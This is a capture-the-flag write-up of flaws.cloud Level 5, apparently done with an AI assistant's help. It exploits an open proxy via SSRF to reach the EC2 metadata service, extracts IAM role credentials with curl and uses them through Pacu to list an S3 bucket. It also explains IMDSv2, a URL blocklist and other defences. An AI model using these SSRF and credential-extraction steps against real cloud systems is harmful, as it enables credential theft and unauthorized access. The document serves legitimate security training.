# Level 5 Writeup - SSRF to EC2 Metadata Service

**Completed:** December 3, 2025  
**Assisted by:** Claude (AI pair programming assistant)

---

## Challenge Overview

Level 5 presents an EC2 instance running an HTTP proxy service. The challenge provides example URLs showing how the proxy works and asks us to use it to list the contents of the level6 S3 bucket to find a hidden directory.

**Target Proxy:** `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/`  
**Goal:** List the level6 bucket at `level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud`

## Approach

### Step 1: Understanding the Proxy

The challenge shows example proxy usage:
- `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/`
- `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml`
- `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/`

The proxy takes a URL path after `/proxy/` and fetches that resource from the EC2 instance. This is a classic **Server-Side Request Forgery (SSRF)** setup.

### Step 2: Identifying the Attack Vector

Since the proxy runs on an EC2 instance, we can potentially access resources that are only available from within AWS:

1. **VPC internal resources** - Private subnets, internal services
2. **EC2 Instance Metadata Service** - Available at `169.254.169.254`

The **Instance Metadata Service (IMDS)** is the more universal target since it's available on every EC2 instance.

### Step 3: Accessing the Metadata Service

We used curl to access the metadata service through the proxy:

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/
```

**Result:**
```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
system
```

The metadata service responded! The most interesting path is **`iam/`** which contains IAM role credentials.

### Step 4: Discovering the IAM Role

We navigated to the IAM security credentials:

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Result:**
```
flaws
```

An IAM role named **`flaws`** is attached to this EC2 instance.

### Step 5: Extracting Temporary Credentials

We fetched the credentials for the `flaws` role:

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
```

**Result:**
```json
{
  "Code" : "Success",
  "LastUpdated" : "2025-12-03T14:59:33Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...[REDACTED]",
  "SecretAccessKey" : "[REDACTED]",
  "Token" : "[REDACTED - long session token]",
  "Expiration" : "2025-12-03T21:21:11Z"
}
```

**Critical Finding:** We obtained temporary AWS credentials including:
- `AccessKeyId` (starts with `ASIA` = temporary/session credentials)
- `SecretAccessKey`
- `Token` (session token required for temporary credentials)

### Step 6: Configuring Pacu with Stolen Credentials

We set up a new Pacu session with the stolen credentials:

```
Pacu> set_keys
Key alias: level5
Access key ID: ASIA...[REDACTED]
Secret access key: [REDACTED]
Session token: [REDACTED]
```

Verified the identity:

```
Pacu> whoami
{
  "RoleName": "flaws",
  "Arn": "arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783",
  "AccountId": "975426262029"
}
```

### Step 7: Listing the Level 6 Bucket

With the stolen credentials, we listed the level6 S3 bucket:

```bash
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ --region us-west-2
```

**Result:**
```
                           PRE ddcc78ff/
2017-02-27 02:11:07        871 index.html
```

**Found the hidden directory:** `ddcc78ff/`

### Step 8: Accessing Level 6

Navigated to the hidden directory:

```
http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
```

**Result:** Access granted to Level 6!

## Tools Used

| Tool | Purpose |
|------|---------|
| `curl` | Accessing the proxy and metadata service |
| Pacu | AWS exploitation framework for credential management |
| `aws s3 ls` | Listing S3 bucket contents with stolen credentials |
| Browser | Navigating to the challenge pages |

## Security Concepts

### EC2 Instance Metadata Service (IMDS)

Every EC2 instance can access a special HTTP service at `169.254.169.254`:

| Endpoint | Description |
|----------|-------------|
| `/latest/meta-data/` | Instance information (ID, type, IPs, etc.) |
| `/latest/meta-data/iam/security-credentials/` | IAM role credentials |
| `/latest/user-data` | Instance startup scripts |
| `/latest/dynamic/instance-identity/document` | Instance identity document |

### Why 169.254.169.254?

- **Link-local address** - Only valid on the local network segment
- **Not routable** - Cannot be accessed from the internet
- **Intercepted by hypervisor** - AWS responds at the infrastructure level
- **Universal** - Same address on AWS, GCP, Azure, DigitalOcean

### Server-Side Request Forgery (SSRF)

SSRF occurs when an attacker can make a server perform HTTP requests on their behalf:

```
Attacker → Proxy Server → Internal Resource (169.254.169.254)
                ↓
         Returns data to attacker
```

### The Attack Chain

```
Open HTTP Proxy → SSRF to 169.254.169.254 → 
Extract IAM Credentials → Use Credentials to Access S3 → Find Hidden Directory
```

## Vulnerability Explained

**The Misconfiguration:** An HTTP proxy service was deployed without proper URL validation, allowing requests to internal/link-local addresses.

**Why This Happens:**
1. Developer creates proxy for legitimate purpose (content fetching, caching)
2. No allowlist/blocklist implemented for destination URLs
3. Proxy happily fetches any URL, including `169.254.169.254`
4. EC2 instance has IAM role attached for AWS access
5. Attacker extracts credentials and pivots

**What Was Exposed:**
- Temporary IAM credentials for the `flaws` role
- Access to S3 buckets the role can read
- Instance metadata (instance ID, IP addresses, etc.)

**Real-World Impact:**
- Complete credential theft from EC2 instances
- Lateral movement within AWS environment
- Access to any resources the IAM role can access
- Potential for privilege escalation

## Prevention

| Prevention | Description |
|------------|-------------|
| **IMDSv2** | Require session tokens for metadata access (blocks simple SSRF) |
| **URL validation** | Allowlist permitted destinations, block private/link-local ranges |
| **Network segmentation** | Use security groups to limit outbound access |
| **Least privilege** | Minimize IAM role permissions on EC2 instances |
| **WAF rules** | Block requests containing `169.254.169.254` |
| **Disable metadata** | If not needed, disable IMDS entirely |

### IMDSv2 Protection

AWS introduced IMDSv2 which requires a session token:

```bash
# IMDSv1 (vulnerable) - Simple GET request
curl http://169.254.169.254/latest/meta-data/

# IMDSv2 (protected) - Requires PUT to get token first
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

The PUT request with custom header typically can't be made through simple SSRF proxies.

### Blocking Metadata Access

```python
# Example URL validation
BLOCKED_RANGES = [
    '169.254.169.254',  # Metadata service
    '127.0.0.1',        # Localhost
    '10.0.0.0/8',       # Private
    '172.16.0.0/12',    # Private
    '192.168.0.0/16',   # Private
]

def is_safe_url(url):
    parsed = urlparse(url)
    ip = socket.gethostbyname(parsed.hostname)
    for blocked in BLOCKED_RANGES:
        if ip_in_range(ip, blocked):
            return False
    return True
```

## Key Takeaways

1. **169.254.169.254 is the magic IP** - Universal metadata service address across cloud providers
2. **SSRF + Cloud = Credential Theft** - Any SSRF on cloud instances can potentially steal IAM credentials
3. **Temporary credentials are still powerful** - ASIA keys work just like permanent keys until they expire
4. **Session tokens are required** - For temporary credentials, you need AccessKeyId + SecretAccessKey + Token
5. **IMDSv2 mitigates this** - But many instances still run IMDSv1
6. **Proxy services need URL validation** - Never trust user-supplied URLs without validation

## Real-World Examples

The challenge page mentions several real-world SSRF-to-metadata attacks:

| Company | Vulnerability |
|---------|--------------|
| **Prezi** | URL inclusion feature allowed pointing to 169.254.169.254 |
| **Phabricator** | Similar SSRF to metadata service |
| **Coinbase** | SSRF vulnerability exposed instance credentials |
| **Capital One (2019)** | SSRF in WAF led to massive data breach (100M+ records) |

## Progression

| Level | Vulnerability | Access Method |
|-------|--------------|---------------|
| 1 | S3 bucket open to Everyone | Anonymous (`--no-sign-request`) |
| 2 | S3 bucket open to Any Authenticated AWS User | Any AWS credentials |
| 3 | Leaked credentials in git history | Compromised credentials |
| 4 | Public EBS snapshot with credentials | Mount snapshot, extract secrets |
| 5 | SSRF to EC2 metadata service | Steal IAM role credentials via proxy |

## Next Level

Level 6: `http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`

New credentials provided:
- Access Key ID: `AKIA...[REDACTED]`
- Secret Access Key: `[REDACTED]`
- Policy: SecurityAudit

